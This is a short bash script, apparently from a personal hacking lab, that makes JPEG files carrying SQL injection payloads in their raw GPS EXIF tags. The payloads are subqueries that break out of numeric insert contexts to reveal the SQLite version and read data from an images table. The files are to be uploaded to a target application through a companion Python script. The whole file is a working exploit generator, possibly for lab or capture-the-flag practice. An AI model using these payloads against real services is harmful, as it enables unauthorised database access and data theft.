#!/bin/bash
# gps_deep.sh — GPS lat/long are NUMERIC in the DB (-41.13). Numbers are usually inserted
# WITHOUT quotes: VALUES(..., <lat>, ...). So injection needs NO quote — just break out with
# a comma/paren/operator. exiftool validates GPS, but -TAG# writes raw. Try to smuggle a
# numeric-context payload that returns sqlite_version() so we can spot execution.
EXIFTOOL="/c/Users/Usuario/Documents/GonzaOrban/HackLab/exiftool/exiftool.exe"
BASE_IMG="paisaje_conv.jpg"

mk() { # mk <marker> <tag> <value>
  cp "$BASE_IMG" g_$1.jpg
  "$EXIFTOOL" -overwrite_original -m "-$2=$3" g_$1.jpg >/dev/null 2>&1
  echo "g_$1.jpg  $2 = $("$EXIFTOOL" -s3 -$2 g_$1.jpg)"
}

# No quotes needed for numeric columns. Break out with ) , operators. Use a value that yields
# a number if executed so we can detect it, e.g. append arithmetic or a subquery.
# raw-write the composite into GPSLatitude
mk lat_sub   'GPSLatitude#' "1,(SELECT sqlite_version()))--"
mk lat_pipe  'GPSLatitude#' "1||(SELECT sqlite_version())"
mk lat_paren 'GPSLatitude#' "1)||(SELECT sqlite_version())--"
mk lat_plain 'GPSLatitude#' "41.13,(SELECT user_id FROM images WHERE id=1)"
# also try the decimal composite tag some pipelines read
mk comp      'GPSPosition#' "1,(SELECT sqlite_version())"

echo
echo "upload with: python upload_gps.py"
